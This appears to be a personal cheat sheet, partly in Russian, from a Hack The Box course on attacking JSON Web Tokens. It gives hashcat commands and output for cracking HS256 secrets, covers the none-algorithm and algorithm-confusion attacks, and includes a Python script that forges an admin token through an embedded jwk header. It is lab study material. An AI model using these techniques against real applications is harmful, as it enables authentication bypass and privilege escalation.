# JWT
## Guessing secrets algs
- HS256
- HS384
- HS512

## Attacks
### Missing Signature Verification
Когда изменение claim`а с неизменением подписи позволяет получить доступ

### None Algorithm Attack
Изменить алгоритм подписи на `None`

### Attacking the Signing Secret (Sym algo)
1. Obtain jwt to file
```bash
echo -n eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTcxMTIwNDYzN30.r_rYB0tvuiA2scNQrmzBaMAG2rkGdMu9cGMEEl3WTW0 > jwt.txt
```
2. Run `hashcat` to crack
```bash
mlwrwrk@htb[/htb]$ hashcat -D 1,2 -m 16500 jwt.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (JWT (JSON Web Token))
Hash.Target......: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaH...l3WTW0
Time.Started.....: Sat Mar 23 15:24:17 2024 (2 secs)
Time.Estimated...: Sat Mar 23 15:24:19 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3475.1 kH/s (0.50ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4358144/14344384 (30.38%)
Rejected.........: 0/4358144 (0.00%)
Restore.Point....: 4354048/14344384 (30.35%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: rb270990 -> raynerleow
Hardware.Mon.#1..: Util: 52%

mlwrwrk@htb[/htb]$ hashcat -m 16500 jwt.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --show
```

### Algorithm Confusion (Asym algo)
Change sym algo to asym.

If we dont have public key we can compute it from signature. For this use [rsa_sign2n](https://github.com/silentsignal/rsa_sign2n)

#### Crack JWT with docker
1. Run
```bash
docker run -it --rm sig2n /bin/bash
python3 jwt_forgery.py <jwt1> <jwt2>
```
2. Check if auth is successful. If yes JWT is vulnerable to Algorithm Confusion attack 
3. Obtain public key 
```bash
cat XXXX_YYYY_x509.pem
```
4. Using cyberchef sign new token with public RSA key (**Add new line after key**)
![alt text](images/cyberchef.png)


### Reusing JWT Secrets (Asym algo)

`jwk` contains information about the public key used for key verification for asymmetric JWTs. If the web application is misconfigured to accept arbitrary keys provided in the jwk claim, we could forge a JWT, sign it with our own private key, and then provide the corresponding public key in the jwk claim for the web application to verify the signature and accept the JWT.

#### Exploiting jwk
1. Generate keys for sign JWT
```bash
openssl genpkey -algorithm RSA -out exploit_private.pem -pkeyopt rsa_keygen_bits:2048
openssl rsa -pubout -in exploit_private.pem -out exploit_public.pem
```
2. Manipulate JWT
```python
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from jose import jwk
import jwt

# JWT Payload
jwt_payload = {'user': 'htb-stdnt', 'isAdmin': True}

# convert PEM to JWK
with open('exploit_public.pem', 'rb') as f:
    public_key_pem = f.read()
public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())
jwk_key = jwk.construct(public_key, algorithm='RS256')
jwk_dict = jwk_key.to_dict()

# forge JWT
with open('exploit_private.pem', 'rb') as f:
    private_key_pem = f.read()
token = jwt.encode(jwt_payload, private_key_pem, algorithm='RS256', headers={'jwk': jwk_dict})

print(token)
```
3. Install dependencies/run code
```bash
pip3 install pyjwt cryptography python-jose
python3 exploit.py 
```

#### Exploiting jku
the `jku` claim serves a similar purpose to the jwk claim. However, instead of holding the key details directly, the claim contains a URL that serves the key details. If a web application does not correctly check this claim, it can be exploited by an attacker similar to the jwk claim. The process is nearly identical; however, instead of embedding the key details into the jwk claim, the attacker hosts the key details on his web server and sets the JWT's jku claim to the corresponding URL.

Furthermore, the jku claim may potentially be exploited for `blind GET-based Server Side Request Forgery (SSRF) attacks`.

## [jwt_tool](https://github.com/ticarpi/jwt_tool)
### Installation
```bash
git clone https://github.com/ticarpi/jwt_tool
pip3 install -r requirements.txt
```


